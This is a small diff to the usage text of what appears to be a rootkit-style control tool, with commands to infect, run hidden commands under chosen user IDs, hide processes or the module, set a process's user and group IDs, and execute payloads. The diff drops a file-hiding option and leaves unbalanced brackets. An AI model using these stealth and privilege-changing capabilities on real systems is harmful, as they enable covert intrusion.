@@ -2,8 +2,8 @@ infect
 disinfect
 exec [--bash] [--hide] [--uid <uid>] [--gid <gid>] <command>
 kill <pid>
-hide [--pid <pid> | --file <path>] | --module
-unhide [--pid <pid> | --file <path>] | --module
+hide [--pid <pid> | --module
+unhide [--pid <pid> | --module
 set <pid> [--uid <uid>] [--gid <gid>]
 unset <pid> [--uid] [--gid]
 payload [--list | --exec <name>]
